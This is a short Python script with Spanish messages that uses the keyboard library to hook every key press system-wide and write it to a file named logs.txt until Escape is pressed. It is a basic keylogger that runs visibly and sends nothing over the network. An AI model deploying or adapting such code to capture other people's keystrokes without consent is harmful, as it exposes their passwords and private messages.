import keyboard

print("ESC para parar")

log = open("logs.txt", "w")

def guardar(pressed):
    if pressed.event_type == keyboard.KEY_DOWN:
        tecla = pressed.name
        log.write(tecla +" ")

keyboard.hook(guardar)
keyboard.wait("esc")
log.close()